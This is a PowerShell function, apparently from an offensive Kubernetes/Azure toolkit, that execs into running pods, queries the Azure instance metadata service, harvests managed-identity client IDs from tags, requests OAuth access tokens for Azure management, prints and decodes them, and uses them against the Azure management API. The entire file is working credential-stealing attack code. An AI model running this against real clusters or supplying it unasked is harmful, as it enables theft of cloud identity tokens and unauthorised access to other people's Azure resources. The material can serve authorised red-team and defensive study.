<#
.SYNOPSIS
   Retrieves and processes sensitive metadata information from running Kubernetes pods.

.DESCRIPTION
   The Get-MetaDataInformation function attempts to extract metadata information from running Kubernetes pods that have access to the Azure Instance metadata service.
   It checks for pods with the `curl` utility available and retrieves metadata, checks for access tokens, and processes them to obtain further information such as Azure Resource IDs.

.PARAMETER accesstoken
   An optional access token used for authenticating with the Kubernetes API. If not provided, the default authentication context will be used.
   Alias: a

.NOTES
   - This script depends on functions like Get-NameSpaceArray, Perform-KubectlCommand, and others.
   - The function expects a specific environment where `curl` is available on the pods being queried.

.OUTPUTS
   Outputs metadata information and access tokens if found, and performs additional processing on the extracted data.

.EXAMPLE
   # Run the function using a specific access token
   Get-MetaDataInformation -a 'yourAccessToken'

#>

Function Get-MetaDataInformation{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [Alias("t")]
        [string]$accesstoken
    )
    Write-Output "Trying to retrieve sensitive metadata information"
    $namespacesArray = Get-NameSpaceArray
    foreach ($namespace in $namespacesArray) {
        Write-Host "validating: $namespace"
        # Check if the accesstoken is provided and call Get-CanIExecuteInNamespace accordingly
        if ($PSBoundParameters.ContainsKey('accesstoken') -and $accesstoken) {
            # If accesstoken is provided, pass it to the function
            $canExecute = Get-CanIExecuteInNamespace -namespace $namespace -Token $accesstoken -command "get pods --subresource=exec"
        } else {
            # If accesstoken is not provided, call the function without it
            $canExecute = Get-CanIExecuteInNamespace -namespace $namespace -command "get pods --subresource=exec"
        }
        if($canExecute){
            #Only retrieve running pods in this namespaces and retrieve the metadata name Only one is needed so select the first object.
            $runningPod
            if ($PSBoundParameters.ContainsKey('accesstoken') -and $accesstoken) {
                # If accesstoken is provided, pass it to the function
                $runningPod = Perform-KubectlCommand -action "get" -type "pods" -namespace $namespace -extracommand '--field-selector=status.phase=Running --no-headers -o custom-columns"=:metadata.name"' -accesstoken $accesstoken 
            } else {
                # If accesstoken is not provided, call the function without it
                $runningPod = Perform-KubectlCommand -action "get" -type "pods" -namespace $namespace -extracommand '--field-selector=status.phase=Running --no-headers -o custom-columns"=:metadata.name"'
            }
            Write-Debug "The Following Running pods wehere found: $runningPod"
            foreach($pod in $runningPod){
                #validate if curl is available
                if ($PSBoundParameters.ContainsKey('accesstoken') -and $accesstoken) {
                    # If accesstoken is provided, pass it to the function
                    $curl = Perform-KubectlExecCommand -pod $pod -namespace $namespace -Token $accesstoken -command 'which curl'
                } else {
                    # If accesstoken is not provided, call the function without it
                    $curl = Perform-KubectlExecCommand -pod $pod -namespace $namespace -command 'which curl'
                }
                Write-Debug "Curl value return: $curl"
                if ([string]::IsNullOrEmpty($curl)) {
                    continue;
                }
                Write-Host "Found atleast one pod running with curl to exec $pod" -ForegroundColor Green
                if ($PSBoundParameters.ContainsKey('accesstoken') -and $accesstoken) {
                    # If accesstoken is provided, pass it to the function
                    $metadataData = Perform-KubectlExecCommand -pod $pod -namespace $namespace -Token $accesstoken -command 'curl "http://169.254.169.254/metadata/instance?api-version=2020-10-01" -H Metadata:true -s 2>$null'
                } else {
                    # If accesstoken is not provided, call the function without it
                    $metadataData = Perform-KubectlExecCommand -pod $pod -namespace $namespace -command 'curl "http://169.254.169.254/metadata/instance?api-version=2020-10-01" -H Metadata:true -s 2>$null'
                }
                Write-Host $metadataData
                if ([string]::IsNullOrEmpty($metadataData)) {
                    Write-Host "No metadata information was retrieved on the host, possibly blocked" -ForegroundColor Red
                    continue;
                }
                Write-Host "Writing metadata information to file"
                # Get the script's directory
                $filePath = Join-Path -Path $PSScriptRoot -ChildPath "metadataInformation${namespace}_${pod}.json"
                $metadataData | Out-File -FilePath filePath

                #I want to filter items in the taglist these could contain pattenrs of serviceaccountID's
                Write-Debug "Listing metadata $metadataData" 
                $possibleTargets = $metadataData | jq .compute.tagsList[]?.value | Sort-Object -U
                Write-Debug "Listing possible targets: $possibleTargets"
                #The regex which i will use for searching the targets
                $pattern = '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
                #matches
                $matches = [regex]::Matches($possibleTargets, $pattern)
                # Output each match
                foreach ($match in $matches) {
                    $client_id=$match.Value
                    Write-Debug "url to test: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&client_id=&resource=https%3A%2F%2Fmanagement.azure.com%2F"
                    $url= "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&client_id="+ $client_id + "&resource=https%3A%2F%2Fmanagement.azure.com%2F -H Metadata:true -s"
                    $command = "curl $url"
                    if ($PSBoundParameters.ContainsKey('accesstoken') -and $accesstoken) {
                        # If accesstoken is provided, pass it to the function
                        $IdentityMetadata = Perform-KubectlExecCommand -pod $pod -namespace $namespace -accesstoken $accesstoken -command $command

                    } else {
                        # If accesstoken is not provided, call the function without it
                        $IdentityMetadata = Perform-KubectlExecCommand -pod $pod -namespace $namespace -command $command
                    }
                    $access_token = $IdentityMetadata | jq .access_token | ForEach-Object { $_.Trim('"') }
                    if ([string]::IsNullOrWhiteSpace($access_token)) {
                        continue;
                    }
                    Write-Host "We found an access token printing below. This can be used to retrieve data through the azure cli" -ForegroundColor Green
                    $access_token

                    Write-Host "validating access permissions"
                    # Example usage
                    $decodedToken = Decode-Jwt -JwtToken $access_token

                    Write-Host "Header:" $decodedToken.Header
                    Write-Host "Payload:" $decodedToken.Payload

                        # Convert JSON to PowerShell object
                    $payload = $decodedToken.Payload | ConvertFrom-Json
                    $propertyName = "xms_az_rid"                        
                        # Extract the specific property
                    if ($payload.PSObject.Properties[$PropertyName]) {
                        $valuexms_az_rid = $payload.$PropertyName
                        Write-Host "xms_az_rid is: $valuexms_az_rid "
                        Write-Host "whole url: https://management.azure.com${valuexms_az_rid}?api-version=2019-09-01"
                    } else {
                        Write-Host "Property '$PropertyName' not found in JWT payload."  -ForegroundColor Red
                    }
                    Write-Host "Perform call to managment azure with this information "
                    Invoke-WebRequest -Uri "https://management.azure.com${valuexms_az_rid}?api-version=2019-09-01" -Headers @{"Authorization" = "Bearer $access_token"} -Method Get 2>$null

                    Write-Host "With the xms information you can also try to list te resource which belong to that managedIdenitty in azure With the following command" 
                    Write-Host "az identity list-resources --resource-group <ResourceGroupName> --name <ManagedIdentityName>"
                }
            }
        } 
    } 
} 